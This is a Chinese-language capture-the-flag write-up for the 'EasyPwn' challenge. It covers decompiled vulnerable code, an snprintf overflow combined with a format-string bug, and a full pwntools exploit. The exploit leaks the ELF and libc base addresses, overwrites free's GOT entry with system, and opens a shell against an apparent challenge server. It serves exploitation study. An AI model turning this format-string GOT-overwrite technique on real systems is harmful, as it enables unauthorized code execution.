# EasyPwn

## 来源
World of Attack & Defense


## 难度

4 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

是一个输入内容后,然后又打印的一个程序,有两种方式进行此功能,一个是采用堆储存,另一种是采用栈储存.

## vul

```c
unsigned __int64 sub_B30()
{
  char s; // [rsp+10h] [rbp-BF0h]
  char v2; // [rsp+410h] [rbp-7F0h]
  __int64 v3; // [rsp+7F8h] [rbp-408h]
  unsigned __int64 v4; // [rsp+BF8h] [rbp-8h] //vul

  v4 = __readfsqword(0x28u);
  memset(&s, 0, 0x400uLL);
  memset(&v3, 0, 8uLL);
  memset(&v2, 0, 0x7E8uLL);
  LOWORD(v3) = 0x7325;
  BYTE2(v3) = 0;
  puts("Welcome To WHCTF2017:");
  read(0, &s, 0x438uLL);
  snprintf(&v2, 0x7D0uLL, (const char *)&v3, &s);// vul 3E8
  printf("Your Input Is :%s\n", &v2);
  return __readfsqword(0x28u) ^ v4;
}
```

在输入大于0x3E8后,可以覆盖到v4内容,表明上是没有覆盖,但在snprintf函数进行复制的时候,就可以覆盖.

## 知识点

printf, snprintf,sprintf函数的机制, fmt

## 思路

通过snprintf函数的溢出和字符串漏洞获取程序基址和libc基址,然后再通过字符串漏洞修改free的got表中的地址为system, 然后执行第二个功能传入'/bin/sh'即可get shell,注意,要预先free一次,这样才free的got表地址才会链接到libc中



## 思考

snprintf为啥能够实现字符串漏洞,它起初不是传入了'%s'了吗?

答: 是因为snprintf是每读取一个字符都查看一下格式化参数,,所以在后面修改这个参数后就可以实现了字符串漏洞了.

```c
#include <stdio.h>
int main(void) {
        char *a = "AAAAAAAA  %p";
        char b[8] = {0};
        char c[1000] = "%s";

        //snprintf(b, 100, a);
        sprintf(b, c, a); //vul
        printf("%s\n", b);

        return 0;
}
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn1'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 50152

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fun1(data):
	sla('Code:\n', '1')
	sa('2017:', data)

def fun2(data):
	sla('Code:\n', '2')
	sa('Name:\n', data)

#--------------------------Exploit--------------------------
def exploit():
	# leak elf base
	leak_offset = 402
	p = 'A' * 0x3e8
	p += 'AA' + '%' + str(leak_offset) + '$p' # AA for ajust
	fun1(p)

	ru('0x')
	elf_base = int(r(12), 16) - (0x555555554c3c - 0x555555554000)
	li('elf_base ' + hex(elf_base))
	free_got = elf_base + exe.got['free']
	li('free_got ' + hex(free_got))

	# leak libc
	leak_offset = 398
	p = 'A' * 0x3e8
	p += 'AA' + '%' + str(leak_offset) + '$p' # AA for ajust
	fun1(p)
	ru('0x')
	lib.address = int(r(12), 16) - lib.sym['__libc_start_main'] - 240
	li('libc_base ' + hex(lib.address))

	# for set got table
	fun2('A')


	#(0x7fffffffd850 - 0x7fffffffd470) / 8= 0x7C

	li('system ' + hex(lib.sym['system']))

	sys_0 = lib.sym['system'] & 0xFFFF
	sys_1 = (lib.sym['system'] & 0xFF0000) >> (8 * 2)

	li('sys_0 ' + hex(sys_0))
	li('sys_1 ' + hex(sys_1))

	offset = 0x7C  + 9
	p = 'A' * 0x3e8 + 'AA' # for alignment
	p += '%' +  str(sys_0 - len(p) - 0x14)
	p += 'c%' + str(offset + 1) + '$hn'
	p += p64(free_got)
	fun1(p)

	offset = 0x7C  + 9
	p = 'A' * 0x3e8 + 'AA' # for alignment

	p2 = str(sys_1 + 2)
	p2 = p2.rjust(4, '0')

	p += '%' + p2
	p += 'c%' + str(offset + 1) + '$hhn'
	p += p64(free_got + 2)
	fun1(p)

	#db()

	fun2('/bin/sh\x00')

def finish():
	ia()
	c()
#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

